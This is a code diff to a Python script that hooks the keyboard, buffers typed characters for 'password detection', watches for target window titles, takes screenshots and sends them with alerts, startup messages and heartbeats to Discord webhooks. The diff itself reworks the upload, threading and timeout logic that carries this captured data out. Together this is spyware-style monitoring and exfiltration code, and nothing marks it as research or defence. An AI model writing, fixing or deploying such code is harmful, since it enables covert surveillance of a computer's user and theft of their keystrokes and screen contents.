@@ -118,6 +118,7 @@ password_buffer = ""    # Stores typed characters for password detection
 last_key_time = 0       # For clearing password buffer after timeout
 detected_targets = set()  # Track already detected targets to avoid duplicate notifications
 last_heartbeat_time = time.time()  # Track when last heartbeat was sent
+program_start_time = time.time()  # Track program start time
 
 # ---------------- HELPERS ---------------- #
 def title_matches_target(title: str) -> bool:
@@ -141,31 +142,51 @@ def take_screenshot():
         print(f"[SCREENSHOT ERROR] {e}")
         return None
 
-def send_to_webhook(webhook_url, payload, files=None):
+def send_to_webhook(webhook_url, payload, screenshot_bytes=None):
     """Send data to a specific webhook URL"""
     try:
-        if files:
-            response = requests.post(
-                webhook_url,
-                files=files,
-                data={'payload_json': json.dumps(payload)}
-            )
+        if screenshot_bytes:
+            # Create a new BytesIO object for each webhook
+            img_byte_arr = io.BytesIO(screenshot_bytes)
+            files = {
+                'file': ('screenshot.png', img_byte_arr, 'image/png')
+            }
+            
+            # Prepare multipart form data
+            if 'embeds' in payload:
+                data = {'payload_json': json.dumps(payload)}
+                response = requests.post(
+                    webhook_url,
+                    files=files,
+                    data=data,
+                    timeout=10
+                )
+            else:
+                # If no embeds, just send with files
+                response = requests.post(
+                    webhook_url,
+                    files=files,
+                    data=payload,
+                    timeout=10
+                )
         else:
             headers = {'Content-Type': 'application/json'}
             response = requests.post(
                 webhook_url,
                 json=payload,
-                headers=headers
+                headers=headers,
+                timeout=10
             )
         
         if response.status_code in [200, 204]:
+            print(f"[WEBHOOK SUCCESS] Sent to {webhook_url[:40]}...")
             return True
         else:
-            print(f"[WEBHOOK ERROR] Failed to send to {webhook_url[:50]}...: {response.status_code}")
+            print(f"[WEBHOOK ERROR] Failed to send to {webhook_url[:40]}...: {response.status_code} - {response.text}")
             return False
             
     except Exception as e:
-        print(f"[WEBHOOK ERROR] {e} for {webhook_url[:50]}...")
+        print(f"[WEBHOOK ERROR] {e} for {webhook_url[:40]}...")
         return False
 
 def send_to_all_webhooks(payload, screenshot=None):
@@ -177,31 +198,28 @@ def send_to_all_webhooks(payload, screenshot=None):
     success_count = 0
     threads = []
     
+    # Convert screenshot to bytes once
+    screenshot_bytes = None
     if screenshot and SEND_SCREENSHOTS:
-        # Convert screenshot to bytes once
         img_byte_arr = io.BytesIO()
         screenshot.save(img_byte_arr, format='PNG')
-        img_byte_arr.seek(0)
-        
-        # Prepare files for multipart upload
-        files = {
-            'file': ('screenshot.png', img_byte_arr, 'image/png')
-        }
+        screenshot_bytes = img_byte_arr.getvalue()  # Get raw bytes
         
         # Add screenshot info to payload
-        if 'content' in payload:
-            payload['content'] = "📸 **Screenshot captured below:**"
+        if 'embeds' in payload:
+            if 'content' not in payload or not payload['content']:
+                payload['content'] = "📸 **Screenshot captured below:**"
     
     for webhook_url in DISCORD_WEBHOOKS:
         if not webhook_url or webhook_url == "YOUR_DISCORD_WEBHOOK_URL_HERE":
             continue
             
         # Create thread for each webhook
-        if screenshot and SEND_SCREENSHOTS:
+        if screenshot_bytes:
             thread = threading.Thread(
                 target=send_to_webhook,
                 args=(webhook_url, payload),
-                kwargs={'files': files}
+                kwargs={'screenshot_bytes': screenshot_bytes}
             )
         else:
             thread = threading.Thread(
@@ -214,7 +232,7 @@ def send_to_all_webhooks(payload, screenshot=None):
     
     # Wait for all threads to complete
     for thread in threads:
-        thread.join(timeout=10)  # 10 second timeout per webhook
+        thread.join(timeout=15)  # 15 second timeout per webhook
         
         # Check if thread completed successfully
         if not thread.is_alive():
@@ -338,7 +356,7 @@ def toggle_tracking():
     print(f"[TRACKING] Tracking {status}")
     
     # Send Discord notification about status change
-    send_discord_status(status)
+    threading.Thread(target=send_discord_status, args=(status,), daemon=True).start()
     
     password_buffer = ""  # Clear password buffer
 
@@ -407,7 +425,7 @@ def heartbeat_monitor():
             
             # Check if it's time to send heartbeat
             if current_time - last_heartbeat_time >= HEARTBEAT_INTERVAL:
-                send_heartbeat()
+                threading.Thread(target=send_heartbeat, daemon=True).start()
                 last_heartbeat_time = current_time
             
             # Sleep for 1 minute and check again
@@ -421,13 +439,10 @@ def heartbeat_monitor():
 print("[SYSTEM] Monitoring started...")
 print("[SYSTEM] Tracking is ENABLED by default")
 
-# Track program start time for uptime calculation
-program_start_time = time.time()
-
 # Send startup webhook immediately
 if DISCORD_WEBHOOKS and any(wh != "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
     print(f"[STARTUP] Sending startup webhook to {len(DISCORD_WEBHOOKS)} webhooks...")
-    send_startup_message()
+    threading.Thread(target=send_startup_message, daemon=True).start()
     
     # Start heartbeat monitor in a separate thread
     heartbeat_thread = threading.Thread(target=heartbeat_monitor, daemon=True)
@@ -442,16 +457,16 @@ for i, webhook_url in enumerate(DISCORD_WEBHOOKS, 1):
     if webhook_url and webhook_url != "YOUR_DISCORD_WEBHOOK_URL_HERE":
         print(f"[DISCORD] Webhook {i} configured")
         try:
-            response = requests.get(webhook_url)
-            if response.status_code == 200:
-                print(f"[DISCORD] Webhook {i} URL is valid")
+            # Just check if URL looks valid, don't actually send GET request
+            if webhook_url.startswith("https://discord.com/api/webhooks/") or webhook_url.startswith("https://discordapp.com/api/webhooks/"):
+                print(f"[DISCORD] Webhook {i} URL format is valid")
                 valid_webhooks.append(webhook_url)
             else:
-                print(f"[DISCORD WARNING] Webhook {i} returned status: {response.status_code}")
-                valid_webhooks.append(webhook_url)  # Still add it, might work for posting
+                print(f"[DISCORD WARNING] Webhook {i} has unusual format")
+                valid_webhooks.append(webhook_url)
         except:
-            print(f"[DISCORD] Could not test webhook {i} (might still work for posting)")
-            valid_webhooks.append(webhook_url)  # Still add it
+            print(f"[DISCORD] Could not test webhook {i} (will still try to post)")
+            valid_webhooks.append(webhook_url)
 
 if valid_webhooks:
     print(f"[DISCORD] {len(valid_webhooks)}/{len(DISCORD_WEBHOOKS)} webhooks are valid - Screenshots: {SEND_SCREENSHOTS}")
@@ -490,7 +505,7 @@ try:
                         # Small delay before taking screenshot to ensure window is focused
                         time.sleep(SCREENSHOT_DELAY)
                         
-                        # Take screenshot in main thread to avoid threading issues
+                        # Take screenshot in main thread
                         screenshot = take_screenshot() if SEND_SCREENSHOTS else None
                         
                         # Send alert to both webhooks
@@ -515,5 +530,5 @@ except KeyboardInterrupt:
 
 finally:
     # Cleanup
-    kb_listener.unhook_all()
+    keyboard.unhook_all()
     print("[SYSTEM] Keyboard listeners stopped")
